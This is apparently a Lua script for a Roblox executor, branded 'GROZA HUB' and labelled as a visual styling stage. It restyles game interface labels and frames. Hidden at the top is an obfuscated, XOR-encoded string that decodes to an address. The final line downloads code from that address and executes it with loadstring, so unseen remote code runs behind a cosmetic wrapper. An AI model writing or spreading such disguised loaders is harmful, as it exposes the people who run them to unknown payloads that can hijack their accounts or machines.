
--[[ STAGE 2: VISUAL CORE ]]
local HCiyz73n2QFCsB="\055\002\005\000\004\076\066\069\009\057\014\070\000\005\017\004\018\000\020\021\006\020\006\021\021\026\012\022\031\088\014\029\026\095\031\225\225\021\224\027\226\025\231\237\031\043\031\238\230\227\234\249\226\238\241\053\242\233\240\246\056\027\029\237\018\227\225\241\025\254\204\245\031\199\203\195\213\203\203\225\204\208\196\232\214\196\194\249\212\221\219\205\206\203\207\031\211\030\232\226\235\232\227\160\170\217"local EOx4X0ndLvdk1Ir1WhQFDK=97 local PAsaplpcZrgUy7kcC=219 local bQkINnU5sagzircbf9Q9dI=1 local DZqaa4rxbI8snOe_gkHf=1 local wJz5lECtHAsPE=18 local RvugYPsIcFNVtE0CjXI=false local T1iwZdCqCKP6WwdGQ1=bit32 and bit32.bxor if not T1iwZdCqCKP6WwdGQ1 then T1iwZdCqCKP6WwdGQ1=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local U2ahXru9vkCpi_Ui={}for okNMXR2pO1ORn=1,#HCiyz73n2QFCsB do local sIhg6dZXfjszSjNPkN=string.byte(HCiyz73n2QFCsB,okNMXR2pO1ORn)local VRjJRBAPHNv8CFzFKadJ=(PAsaplpcZrgUy7kcC+(okNMXR2pO1ORn*DZqaa4rxbI8snOe_gkHf)+wJz5lECtHAsPE)%256 if bQkINnU5sagzircbf9Q9dI==0 then sIhg6dZXfjszSjNPkN=(sIhg6dZXfjszSjNPkN-VRjJRBAPHNv8CFzFKadJ)%256 U2ahXru9vkCpi_Ui[okNMXR2pO1ORn]=string.char(T1iwZdCqCKP6WwdGQ1(sIhg6dZXfjszSjNPkN,EOx4X0ndLvdk1Ir1WhQFDK))else sIhg6dZXfjszSjNPkN=T1iwZdCqCKP6WwdGQ1(sIhg6dZXfjszSjNPkN,EOx4X0ndLvdk1Ir1WhQFDK)U2ahXru9vkCpi_Ui[okNMXR2pO1ORn]=string.char((sIhg6dZXfjszSjNPkN-VRjJRBAPHNv8CFzFKadJ)%256)end end local VHN9WCd6nkrYPljR=table.concat(U2ahXru9vkCpi_Ui)if RvugYPsIcFNVtE0CjXI then VHN9WCd6nkrYPljR=string.reverse(VHN9WCd6nkrYPljR)end local RApFWFhVskS8PUk=VHN9WCd6nkrYPljR
local HubName = "GROZA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(RApFWFhVskS8PUk))()
